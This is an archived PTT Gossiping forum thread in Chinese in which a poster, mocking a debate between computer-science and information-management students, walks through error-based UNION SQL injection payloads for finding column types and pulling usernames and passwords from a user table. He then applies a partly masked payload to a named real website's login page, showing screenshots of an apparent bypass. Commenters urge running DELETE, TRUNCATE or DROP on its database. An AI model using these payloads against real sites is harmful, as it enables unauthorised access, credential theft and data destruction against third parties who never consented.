<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		

<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Re: [問卦] 資工人憑什麼瞧不起資管人! - 看板 Gossiping - 批踢踢實業坊</title>
<meta name="robots" content="all">
<meta name="keywords" content="Ptt BBS 批踢踢">
<meta name="description" content="可能你漏聽了吧
其實他們是在講 SQL Injection
當你的系統發出錯誤訊息
告訴你資料欄位格式不對
而導致無法加入自訂user時
">
<meta property="og:site_name" content="Ptt 批踢踢實業坊">
<meta property="og:title" content="Re: [問卦] 資工人憑什麼瞧不起資管人!">
<meta property="og:description" content="可能你漏聽了吧
其實他們是在講 SQL Injection
當你的系統發出錯誤訊息
告訴你資料欄位格式不對
而導致無法加入自訂user時
">
<link rel="canonical" href="https://www.ptt.cc/bbs/Gossiping/M.1503983947.A.AF1.html">

<link rel="stylesheet" type="text/css" href="bbs-common.css">
<link rel="stylesheet" type="text/css" href="bbs-base.css" media="screen">
<link rel="stylesheet" type="text/css" href="bbs-custom.css">
<link rel="stylesheet" type="text/css" href="pushstream.css" media="screen">
<link rel="stylesheet" type="text/css" href="bbs-print.css" media="print">




	</head>
    <body>
		
<div id="fb-root"></div>
<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<div id="topbar-container">
	<div id="topbar" class="bbs-content">
		<a id="logo" hrefhref="http://www.ptt.cc/">批踢踢實業坊</a>
		<span>&rsaquo;</span>
		<a class="board" hrefhref="http://www.ptt.cc/bbs/Gossiping/index.html"><span class="board-label">看板 </span>Gossiping</a>
		<a class="right small" hrefhref="http://www.ptt.cc/about.html">關於我們</a>
		<a class="right small" hrefhref="http://www.ptt.cc/contact.html">聯絡資訊</a>
	</div>
</div>
<div id="navigation-container">
	<div id="navigation" class="bbs-content">
		<a class="board" hrefhref="http://www.ptt.cc/bbs/Gossiping/index.html">返回看板</a>
		<div class="bar"></div>
		<div class="share">
			<span>分享</span>
			<div class="fb-like" data-send="false" data-layout="button_count" data-width="90" data-show-faces="false" data-href="http://www.ptt.cc/bbs/Gossiping/M.1503983947.A.AF1.html"></div>

			<div class="g-plusone" data-size="medium"></div>
<script type="text/javascript">
window.___gcfg = {lang: 'zh-TW'};
(function() {
var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
po.src = 'https://apis.google.com/js/plusone.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
})();
</script>

		</div>
	</div>
</div>
<div id="main-container">
    <div id="main-content" class="bbs-screen bbs-content"><div class="article-metaline"><span class="article-meta-tag">作者</span><span class="article-meta-value">reinforce15 (可魯貝洛斯)</span></div><div class="article-metaline-right"><span class="article-meta-tag">看板</span><span class="article-meta-value">Gossiping</span></div><div class="article-metaline"><span class="article-meta-tag">標題</span><span class="article-meta-value">Re: [問卦] 資工人憑什麼瞧不起資管人!</span></div><div class="article-metaline"><span class="article-meta-tag">時間</span><span class="article-meta-value">Tue Aug 29 13:19:03 2017</span></div>
<span class="f2">※ 引述《hijkxyzuw (i,j,k) ×(x,y,z)》之銘言：
</span><span class="f6">: 比較好奇，管理學院的 elite 們
</span><span class="f6">: 是怎麼看待資管的。
</span><span class="f6">: 「那群資工來的，在講什麼 SQL 、
</span>
可能你漏聽了吧

其實他們是在講 SQL Injection

當你的系統發出錯誤訊息

告訴你資料欄位格式不對

而導致無法加入自訂user時

可以利用下面語法傳回的錯誤訊息來判讀資料欄位格式

<span class="f3 hl">&#39;UNION SELECT &#39;abc&#39;,1,1,1 FROM tblUser --</span>

你會看到

<a href="http://i.imgur.com/rCSt9we.png" target="_blank" rel="nofollow">http://i.imgur.com/rCSt9we.png</a>
<div class="richcontent"><blockquote class="imgur-embed-pub" lang="en" data-id="rCSt9we"><a href="//imgur.com/rCSt9we"></a></blockquote><script async src="http://s.imgur.com/min/embed.js" charset="utf-8"></script></div>
這樣的回傳錯誤訊息

這裡用 UNION 語法來組合兩句 SELECT 查詢

第一句 SELECT 語法的第一個欄位 UserID 是 int 格式

但對應的第二句 SELECT 語法的第一個欄位的資料是 varchar 格式的 &#39;abc&#39;

因此出現如上圖的錯誤訊息

因此可得知資料表第一個欄位的資料型態是 int

接著繼續測試下一個欄位 當他把一個個欄位測試完畢後

便可以得到整個資料表的欄位格式

例如

<span class="f3 hl">&#39;UNION SELECT 1, &#39;abc&#39;,1,1 FROM tblUser --</span>

利用 UNION 可以進一步獲取 user 帳號和密碼 例如以下列語法

詢問帳號:

<span class="f3 hl">&#39;UNION SELECT UserName,1,1,1 FROM tblUser WHERE UserName&gt;&#39;a&#39;--</span>

SQL server 將回傳下列錯誤訊息

<span class="f3 hl">錯誤類型:</span>
<span class="f3 hl">Microsoft OLE DB Provider for SQL server (0x80040E07)</span>
<span class="f3 hl">將 nvarchar 數值 &#39;admin&#39; 轉換成資料型別為 int 的資料行語法錯誤。</span>
<span class="f3 hl">/sqlinject/login.asp, line 15</span>

這是因傳回的記錄 &#34;admin&#34; 是 nvarchar 格式

而透過 union 對應到原先 int 資料欄位

因此有上述的錯誤訊息

由以上的訊息得知有一個稱為 &#34;admin&#34; 的帳號存在

然後再以下列語法獲得該帳號的密碼

<span class="f3 hl">&#39;UNION SELECT Password,1,1,1 FROM tblUser WHERE UserName=&#39;admin&#39;--</span>

還可以這樣做

<span class="f3 hl">&#39;UNION SELECT UserName,1,1,1 FROM tblUser WHERE UserName&gt;&#39;admin&#39;--</span>

這樣能幹嘛呢?

這個 <a href="http://www.pk-abc.com/" target="_blank" rel="nofollow">http://www.pk-abc.com/</a>

看來登入頁面在這裡 <a href="http://www.pk-abc.com/login.aspx" target="_blank" rel="nofollow">http://www.pk-abc.com/login.aspx</a>

一般情況下沒註冊登入

會變這樣

<a href="http://i.imgur.com/ebBdIKK.png" target="_blank" rel="nofollow">http://i.imgur.com/ebBdIKK.png</a>
<div class="richcontent"><blockquote class="imgur-embed-pub" lang="en" data-id="ebBdIKK"><a href="//imgur.com/ebBdIKK"></a></blockquote><script async src="http://s.imgur.com/min/embed.js" charset="utf-8"></script></div>
<a href="http://i.imgur.com/SYiKwtW.png" target="_blank" rel="nofollow">http://i.imgur.com/SYiKwtW.png</a>
<div class="richcontent"><blockquote class="imgur-embed-pub" lang="en" data-id="SYiKwtW"><a href="//imgur.com/SYiKwtW"></a></blockquote><script async src="http://s.imgur.com/min/embed.js" charset="utf-8"></script></div>
那如果想辦法繞過呢?

先輸入些語法試試

帳號就輸入

<span class="f3 hl">&#39;UNION SELECT Membe**************M Member WHERE Member_Name=&#39;可魯貝洛斯&#39; --</span>

不要問為什麼 把我上面那串一字不漏的複製貼上就對了(感覺本光會有危險 先打碼)

密碼就隨便輸入6位 數字 <span class="f3 hl">123456 538573 787878</span> 都行

按登入 會變這樣

<a href="http://i.imgur.com/4b***5n.png" target="_blank" rel="nofollow">http://i.imgur.com/4b***5n.png</a>
<div class="richcontent"><img src="http://i.imgur.com/4b***5n.png" alt="" /></div>
<a href="http://i.imgur.com/B**JuIK.png" target="_blank" rel="nofollow">http://i.imgur.com/B**JuIK.png</a>
<div class="richcontent"><img src="http://i.imgur.com/B**JuIK.png" alt="" /></div>
至於下面那張圖裡面是什麼 不知道不要問我 我什麼都不知道

<a href="http://i.imgur.com/6*po**5.png" target="_blank" rel="nofollow">http://i.imgur.com/6*po**5.png</a>
<div class="richcontent"><img src="http://i.imgur.com/6*po**5.png" alt="" /></div>


<span class="f6">: primiry key 、 normalization 都聽不懂。
</span><span class="f6">: 好宅喔，管理學院怎麼會有這種人？」
</span>

--
<span class="f2">※ 發信站: 批踢踢實業坊(ptt.cc), 來自: 1.161.136.48
</span><span class="f2">※ 文章網址: <a href="https://www.ptt.cc/bbs/Gossiping/M.1503983947.A.AF1.html" target="_blank" rel="nofollow">https://www.ptt.cc/bbs/Gossiping/M.1503983947.A.AF1.html</a>
</span><div class="push"><span class="hl push-tag">推 </span><span class="f3 hl push-userid">AppleOuO</span><span class="f3 push-content">: 快推 不然別人以為我看不懂</span><span class="push-ipdatetime"> 08/29 13:19
</span></div><div class="push"><span class="hl push-tag">推 </span><span class="f3 hl push-userid">ufoking</span><span class="f3 push-content">: 嗯 跟我想得差不多</span><span class="push-ipdatetime"> 08/29 13:20
</span></div><div class="push"><span class="f1 hl push-tag">噓 </span><span class="f3 hl push-userid">alex94539</span><span class="f3 push-content">: 講人話好爆</span><span class="push-ipdatetime"> 08/29 13:20
</span></div><div class="push"><span class="hl push-tag">推 </span><span class="f3 hl push-userid">A0091127</span><span class="f3 push-content">: 哈哈</span><span class="push-ipdatetime"> 08/29 13:21
</span></div><div class="push"><span class="hl push-tag">推 </span><span class="f3 hl push-userid">soga0806</span><span class="f3 push-content">: 現在是欺負寫firmware 的人看不懂484？</span><span class="push-ipdatetime"> 08/29 13:21
</span></div><div class="push"><span class="hl push-tag">推 </span><span class="f3 hl push-userid">YahooTaiwan</span><span class="f3 push-content">: OK 現行犯 1.161.136.48</span><span class="push-ipdatetime"> 08/29 13:22
</span></div><div class="push"><span class="hl push-tag">推 </span><span class="f3 hl push-userid">he00589298</span><span class="f3 push-content">: 靠妖  最後是別人的帳號跟密碼喔</span><span class="push-ipdatetime"> 08/29 13:23
</span></div><div class="push"><span class="hl push-tag">推 </span><span class="f3 hl push-userid">ChungLi5566</span><span class="f3 push-content">: 怎麼不幫它下個delete from</span><span class="push-ipdatetime"> 08/29 13:23
</span></div><span class="f2">※ 編輯: reinforce15 (1.161.136.48), 08/29/2017 13:25:12
</span><div class="push"><span class="hl push-tag">推 </span><span class="f3 hl push-userid">ken52011219</span><span class="f3 push-content">: 靠北阿 哈哈哈 你是假教學真抓漏膩</span><span class="push-ipdatetime"> 08/29 13:24
</span></div><div class="push"><span class="hl push-tag">推 </span><span class="f3 hl push-userid">smalltwo</span><span class="f3 push-content">: DELETE太慢.試試看TRUNCATE..對了說不定還有drop的權限</span><span class="push-ipdatetime"> 08/29 13:25
</span></div><div class="push"><span class="hl push-tag">推 </span><span class="f3 hl push-userid">voyage48</span><span class="f3 push-content">: 你真的繞過去了XDD</span><span class="push-ipdatetime"> 08/29 13:25
</span></div><div class="push"><span class="hl push-tag">推 </span><span class="f3 hl push-userid">TllDA</span><span class="f3 push-content">: 第一步  你怎麼知道有tblUser的?</span><span class="push-ipdatetime"> 08/29 13:25
</span></div><div class="push"><span class="hl push-tag">推 </span><span class="f3 hl push-userid">pikakami</span><span class="f3 push-content">: 靠北真的繞過去XDDD</span><span class="push-ipdatetime"> 08/29 13:26
</span></div><span class="f2">※ 編輯: reinforce15 (1.161.136.48), 08/29/2017 13:28:08
</span><div class="push"><span class="f1 hl push-tag">→ </span><span class="f3 hl push-userid">smalltwo</span><span class="f3 push-content">: 你都知道table欄位名字了.再知道更多應該也不是問題</span><span class="push-ipdatetime"> 08/29 13:27
</span></div><span class="f2">※ 編輯: reinforce15 (1.161.136.48), 08/29/2017 13:28:55
</span></div>
    
    <div id="article-polling" data-pollurlhref="http://www.ptt.cc/poll/Gossiping/M.1503983947.A.AF1.html?cacheKey=2052-36268462&offset=4087&offset-sig=2f88992236e22e9cb4545f049463efcfe985befd" data-longpollurl="/v1/longpoll?id=8d3d09d413eb481302a120bfdd8f2a05c5833b72" data-offset="4087"></div>
    

    
<div class="bbs-screen bbs-footer-message">本網站已依台灣網站內容分級規定處理。此區域為限制級，未滿十八歲者不得瀏覽。</div>

</div>

		

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-32365737-1', {
    cookieDomain: 'ptt.cc',
    legacyCookieDomain: 'ptt.cc'
  });
  ga('send', 'pageview');
</script>


		
<script src="jquery.min.js"></script>
<script src="script>

    </body>
</html>
